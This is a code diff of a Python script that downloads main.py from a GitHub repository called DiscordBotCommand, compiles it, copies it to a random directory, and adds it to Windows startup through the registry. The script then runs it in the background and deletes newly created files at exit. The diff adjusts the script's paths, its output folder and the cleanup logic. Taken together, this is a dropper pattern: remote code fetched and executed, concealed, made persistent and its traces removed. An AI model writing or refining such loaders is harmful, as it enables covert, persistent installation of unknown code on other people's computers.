@@ -7,12 +7,11 @@ import shutil
 import random
 import logging
 from pathlib import Path
-from winreg import HKEY_CURRENT_USER, REG_SZ, SetValueEx, OpenKey, KEY_SET_VALUE
 
 # Constants
 SCRIPT_URL = "https://raw.githubusercontent.com/DorkYBru/DiscordBotCommand/main/main.py"
 SCRIPT_FILE_NAME = "downloaded_script.py"
-OUTPUT_EXECUTABLE_NAME = "compiled_script"
+OUTPUT_EXECUTABLE_NAME = "downloaded_script"
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
@@ -28,17 +27,28 @@ def generate_random_directory():
 
 # Import winreg only if the platform is Windows
 if platform.system().lower() == "windows":
-    import winreg
-    HKEY_CURRENT_USER = winreg.HKEY_CURRENT_USER
-    REG_SZ = winreg.REG_SZ
-    SetValueEx = winreg.SetValueEx
-    OpenKey = winreg.OpenKey
-    KEY_SET_VALUE = winreg.KEY_SET_VALUE
+    try:
+        OUTPUT_EXECUTABLE_NAME = "downloaded_script.exe"
+        import winreg
+        HKEY_CURRENT_USER = winreg.HKEY_CURRENT_USER
+        REG_SZ = winreg.REG_SZ
+        SetValueEx = winreg.SetValueEx
+        OpenKey = winreg.OpenKey
+        KEY_SET_VALUE = winreg.KEY_SET_VALUE
+    except ImportError:
+        # Handle the absence of winreg on non-Windows platforms
+        pass
 
 def copy_to_random_location(source_file, random_directory):
     try:
-        shutil.copy2(source_file, random_directory)
-        logger.info(f"Script copied to random location: {random_directory}")
+        # Create the 'dist' directory if it doesn't exist
+        dist_dir = os.path.join(random_directory, 'dist')
+        os.makedirs(dist_dir, exist_ok=True)
+
+        # Copy the compiled script to the 'dist' directory
+        shutil.copy2(source_file, dist_dir)
+
+        logger.info(f"Script copied to random location: {dist_dir}")
     except Exception as e:
         logger.error(f"Failed to copy script to random location: {e}")
         exit()
@@ -79,16 +89,19 @@ def compile_script(script_file):
 
 def run_compiled_script(output_executable):
     try:
-        subprocess.Popen([output_executable])
+        subprocess.Popen([os.path.join(output_executable, OUTPUT_EXECUTABLE_NAME)])
         logger.info(f"Script running in the background")
     except Exception as e:
         logger.error(f"Failed to run the compiled script: {e}")
         exit()
 
-def cleanup():
+def get_initial_directory_state():
+    return set(os.listdir())
+
+def cleanup(initial_state):
     try:
         # List files before running the script
-        before_script_files = set(os.listdir())
+        before_script_files = initial_state
 
         # Remove downloaded script
         if os.path.exists(SCRIPT_FILE_NAME):
@@ -110,8 +123,10 @@ def cleanup():
         for file in new_files:
             file_path = os.path.join(os.getcwd(), file)
             if os.path.isfile(file_path):
-                os.remove(file_path)
-                logger.info(f"New file '{file}' created during script execution removed.")
+                # Exclude the .wingetapi folder from deletion
+                if not (os.path.isdir(file_path) and file_path.endswith('.wingetapi')):
+                    os.remove(file_path)
+                    logger.info(f"New file '{file}' created during script execution removed.")
 
     except Exception as e:
         logger.error(f"Cleanup failed: {e}")
@@ -119,8 +134,11 @@ def cleanup():
 def main():
     current_os = platform.system().lower()
 
+    # Get initial directory state
+    initial_directory_state = get_initial_directory_state()
+
     # Register the cleanup function to be called at exit
-    atexit.register(cleanup)
+    atexit.register(cleanup, initial_directory_state)
 
     try:
         logger.info("Starting script download...")
@@ -136,7 +154,7 @@ def main():
         add_to_startup(os.path.join(random_directory, OUTPUT_EXECUTABLE_NAME))
 
         # Run the compiled script
-        run_compiled_script(os.path.join(random_directory, OUTPUT_EXECUTABLE_NAME))
+        run_compiled_script(random_directory)
     except Exception as e:
         logger.error(f"An error occurred: {e}")
 
